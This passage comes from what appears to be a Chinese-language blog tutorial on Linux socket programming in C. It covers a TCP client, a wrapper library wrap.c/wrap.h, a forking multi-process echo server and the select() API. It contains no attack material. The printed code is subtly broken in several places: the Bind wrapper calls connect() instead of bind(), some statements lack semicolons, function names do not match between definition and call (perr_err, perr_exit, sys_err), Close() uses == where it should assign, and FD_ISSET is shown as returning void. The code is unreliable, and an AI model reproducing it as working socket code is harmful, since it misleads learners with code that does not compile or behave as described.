class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> cfd;</span><br><span class="line"><span class="keyword">int</span> conter = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>;</span></span><br><span class="line">serv_addr.sin_family = AF_INET;</span><br><span class="line">serv_addr.sin_port = htons(SERV_PORT);</span><br><span class="line">inet_pton(AF_INET,<span class="string">"127.0.0.1"</span>,&amp;serv_addr.sin_addr.s_addr);</span><br><span class="line">cfd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(cfd == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"socket error"</span>);</span><br><span class="line"><span class="keyword">int</span> ret = connect(cfd,(struct sockaddr *)&amp;serv_addr,<span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)</span><br><span class="line">sys_err(<span class="string">"connect err"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(--conter)&#123;</span><br><span class="line">write(cfd,<span class="string">"hello\n"</span>,<span class="number">6</span>);</span><br><span class="line">ret = read(cfd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">write(STDOUT_FILENO,buf,ret);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">close(cfd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="实现多进程并发服务器"><a href="#实现多进程并发服务器" class="headerlink" title="实现多进程并发服务器"></a>实现多进程并发服务器</h5><p>首先实现功能封装函数<code>wrap.c</code>，代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"wrap.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">perr_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Accept</span><span class="params">(<span class="keyword">int</span> fd,struct sockaddr *sa,<span class="keyword">socklen_t</span> *salenptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">again:</span><br><span class="line"><span class="keyword">if</span>((n = accept(fd,sa,salenptr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>((errno == ECONNABORTED) || (errno == EINTR))</span><br><span class="line"><span class="keyword">goto</span> again;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">perr_exit(<span class="string">"accept error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Bind</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> struct sockaddr *sa,<span class="keyword">socklen_t</span> salen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">n = connect(fd,sa,salen)</span><br><span class="line"><span class="keyword">if</span>(n&lt;<span class="number">0</span>)&#123;</span><br><span class="line">perr_exit(<span class="string">"connect error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Socket</span><span class="params">(<span class="keyword">int</span> domain,<span class="keyword">int</span> type,<span class="keyword">int</span> protocol)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">n = socket(domain,type,protocol);</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"socket error"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Listen</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">int</span> backlog)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">n = listen(sockfd,backlog);</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"listen error"</span>);</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Connect</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> struct sockaddr *sa,<span class="keyword">socklen_t</span> salen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">n = connect(fd,sa,salen);</span><br><span class="line"><span class="keyword">if</span>(n&lt;<span class="number">0</span>)&#123;</span><br><span class="line">perr_exit(<span class="string">"connect error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">void</span> *ptr,<span class="keyword">size_t</span> nbytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">ssize_t</span> n;</span><br><span class="line">again:</span><br><span class="line"><span class="keyword">if</span>((n = read(fd,ptr,nbytes)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(errno == EINTR)</span><br><span class="line"><span class="keyword">goto</span> again;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Write</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> <span class="keyword">void</span> *ptr,<span class="keyword">size_t</span> nbytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">ssize_t</span> n;</span><br><span class="line">again:</span><br><span class="line"><span class="keyword">if</span>((n = write(fd,ptr,nbytes)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(errno == EINTR)</span><br><span class="line"><span class="keyword">goto</span> again;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Close</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">if</span>((n == close(fd)) == <span class="number">-1</span>)</span><br><span class="line">perr_exit(<span class="string">"close error"</span>);</span><br><span class="line"><span class="keyword">return</span> n</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> Readn(<span class="keyword">int</span> fd,<span class="keyword">void</span> *vptr,<span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">size_t</span> nleft;</span><br><span class="line"><span class="keyword">ssize_t</span> nread;</span><br><span class="line"><span class="keyword">char</span> *ptr;</span><br><span class="line"></span><br><span class="line">ptr = vptr;</span><br><span class="line">nleft = n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(nleft &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>((nread = read(fd,ptr,nleft)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(errno == EINTR)</span><br><span class="line">nread = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">nleft-= nread;</span><br><span class="line">ptr += nread;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n-nleft;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Writen</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> <span class="keyword">void</span> *vptr,<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> nleft;</span><br><span class="line"><span class="keyword">ssize_t</span> nwritten;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *ptr;</span><br><span class="line"></span><br><span class="line">ptr = vptr;</span><br><span class="line">nleft = n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(nleft &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>((nwritten = write(fd,ptr,nleft)) &lt;= <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(nwritten &lt; <span class="number">0</span> &amp;&amp; errno == EINTR)</span><br><span class="line">nwritten = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">nleft -= nwritten;</span><br><span class="line">ptr += nwritten;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现自定义头文件<code>wrap.h</code>，代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _WRAP_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _WRAP_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">perr_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Accept</span><span class="params">(<span class="keyword">int</span> fd,struct sockaddr *sa,<span class="keyword">socklen_t</span> *salenptr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Bind</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> struct sockaddr *sa,<span class="keyword">socklen_t</span> salen)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Connect</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> struct sockaddr *sa,<span class="keyword">socklen_t</span> salen)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Socket</span><span class="params">(<span class="keyword">int</span> domain,<span class="keyword">int</span> type,<span class="keyword">int</span> protocol)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Listen</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">int</span> backlog)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">void</span> *ptr,<span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Write</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> <span class="keyword">void</span> *ptr,<span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Close</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Readn</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">void</span> *vptr,<span class="keyword">size_t</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Writen</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> <span class="keyword">void</span> *vptr,<span class="keyword">size_t</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>实现服务端<code>server.c</code>，代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"wrap.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SRV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">catch_child</span><span class="params">(<span class="keyword">int</span> signum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(waitpid(<span class="number">0</span>,<span class="literal">NULL</span>,WNOHANG) &gt; <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> lfd,cfd;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">srv_addr</span>,<span class="title">clt_addr</span>;</span></span><br><span class="line"><span class="keyword">socklen_t</span> clt_addr_len;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line"><span class="keyword">int</span> ret,i;</span><br><span class="line"><span class="built_in">memset</span>(&amp;srv_addr,<span class="number">0</span>,<span class="keyword">sizeof</span>(srv_addr));</span><br><span class="line">srv_addr.sin_family = AF_INET;</span><br><span class="line">srv_addr.sin_port = htons(SRV_PORT);</span><br><span class="line">srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line">lfd = Socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">Bind(lfd,(struct sockaddr *)&amp;srv_addr,<span class="keyword">sizeof</span>(srv_addr));</span><br><span class="line"></span><br><span class="line">Listen(lfd,<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">clt_addr_len = <span class="keyword">sizeof</span>(clt_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">cfd = Accept(lfd,(struct sockaddr *)&amp;clt_addr,&amp;clt_addr_len);</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">perr_err(<span class="string">"fork error"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">close(lfd);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">struct sigaction act;</span><br><span class="line">act.sa_handler = catch_child;</span><br><span class="line">sigemptyset(&amp;act.sa_mask);</span><br><span class="line">act.sa_flags = <span class="number">0</span>;</span><br><span class="line">ret = sigaction(SIGCHLD,&amp;act,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)</span><br><span class="line">perr_err(<span class="string">"sigaction error"</span>);</span><br><span class="line">close(cfd);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(;;)&#123;</span><br><span class="line">ret = Read(cfd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">0</span>)&#123;</span><br><span class="line">close(cfd);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;ret;i++)</span><br><span class="line">buf[i] = <span class="built_in">toupper</span>(buf[i]);</span><br><span class="line">write(cfd,buf,ret);</span><br><span class="line">write(STDOUT_FILENO,buf,ret);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>联合编译生成<code>server</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc server.c wrap.c -o server</span><br></pre></td></tr></table></figure><h4 id="多路IO转接"><a href="#多路IO转接" class="headerlink" title="多路IO转接"></a>多路IO转接</h4><h5 id="select"><a href="#select" class="headerlink" title="select"></a>select</h5><p>借助内核，select来监听客户端连接、数据通信事件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">select</span><span class="params">(<span class="keyword">int</span> nfds, fd_set *readfds, fd_set *writefds,</span></span></span><br><span class="line"><span class="function"><span class="params">         fd_set *exceptfds, struct timeval *timeout)</span></span>;</span><br><span class="line"></span><br><span class="line">nfds:监听的所有文件描述符中，最大文件文件描述符+<span class="number">1</span></span><br><span class="line">readfds:读文件描述符监听集合</span><br><span class="line">writefds:写文件描述符监听集合</span><br><span class="line">exceptfds:异常文件描述符监听集合</span><br><span class="line">timeout:</span><br><span class="line">&gt;<span class="number">0</span> : 设置监听超时时长</span><br><span class="line">  <span class="literal">NULL</span> : 阻塞监听</span><br><span class="line">  <span class="number">0</span> : 非阻塞监听，轮询</span><br><span class="line"></span><br><span class="line">返回值</span><br><span class="line">    &gt;<span class="number">0</span> : 所有监听集合中，满足对应事件的总数</span><br><span class="line">    <span class="number">0</span> : 没有满足监听条件的文件描述符</span><br><span class="line">    <span class="number">-1</span> : errno</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_ZERO</span><span class="params">(fd_set *<span class="built_in">set</span>)</span> <span class="comment">//清空一个文件描述符集合</span></span></span><br><span class="line"><span class="function">  fd_set rset</span>;</span><br><span class="line">FD_ZERO(&amp;rset);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_SET</span><span class="params">(<span class="keyword">int</span> fd,fd_set *<span class="built_in">set</span>)</span> <span class="comment">//将待监听的文件描述符，添加到监听集合中</span></span></span><br><span class="line"><span class="function">  <span class="title">FD_SET</span><span class="params">(<span class="number">3</span>,&amp;rset)</span>   <span class="title">FD_SET</span><span class="params">(<span class="number">5</span>,&amp;rset)</span>   <span class="title">FD_SET</span><span class="params">(<span class="number">6</span>,&amp;rset)</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_CLR</span><span class="params">(<span class="keyword">int</span> fd,fd_set *<span class="built_in">set</span>)</span>  <span class="comment">//将一个文件描述符从监听集合中移除</span></span></span><br><span class="line"><span class="function">  <span class="title">FD_CLR</span><span class="params">(<span class="number">4</span>,&amp;rset)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_ISSET</span><span class="params">(<span class="keyword">int</span> fd,fd_set *<span class="built_in">set</span>)</span> <span class="comment">//判断一个文件描述符是否在监听集合中</span></span></span><br><span class="line"><span class="function">  <span class="title">FD_ISSET</span><span class="params">(<span class="number">4</span>,&amp;rset)</span></span>;</span><br></pre></td></tr></table></figure><h5 id="使用select实现多路IO转接"><a href="#使用select实现多路IO转接" class="headerlink" 